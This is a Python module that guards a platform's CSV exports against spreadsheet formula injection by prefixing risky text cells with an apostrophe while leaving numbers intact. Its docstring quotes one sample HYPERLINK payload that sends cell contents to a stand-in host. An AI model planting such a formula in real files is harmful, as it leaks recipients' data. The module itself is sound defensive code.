"""CSV a spreadsheet opens as data, never as a formula.

Every CSV the platform serves carries words someone else typed: an issue's title and
repository from a publisher's request, an organisation's name, the reasons and logins
in the decision log. A spreadsheet reads a cell that starts with `=`, `+`, `-`, `@`, a
tab or a carriage return as a formula, and `csv.writer` quotes none of them, so a
title such as `=HYPERLINK("http://x/?"&A1,"click")` would run when a contributor, their
accountant or an auditor opened the export. Such a cell is written with a leading
apostrophe, which a spreadsheet shows as text (OWASP, "CSV Injection").

A plain number is left alone, sign and all. `-5.00` cannot be a formula, and an amount
has to stay a number an accountant can add up.

Every export writes through `Writer`, so a column added later is covered without
anyone remembering to.
"""

from __future__ import annotations

import csv
import re
from collections.abc import Iterable
from typing import TextIO

FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
_NUMBER = re.compile(r"[+-]?\d+(?:\.\d+)?")


def cell(value: object) -> object:
    """The value as a spreadsheet must see it: text that could start a formula gets a
    leading apostrophe; numbers and everything else are unchanged."""
    if isinstance(value, str) and value.startswith(FORMULA_STARTS) and not _NUMBER.fullmatch(value):
        return "'" + value
    return value


class Writer:
    """`csv.writer`, with every cell passed through `cell` on the way out."""

    def __init__(self, out: TextIO) -> None:
        self._rows = csv.writer(out, lineterminator="\n")

    def writerow(self, row: Iterable[object]) -> None:
        self._rows.writerow([cell(value) for value in row])
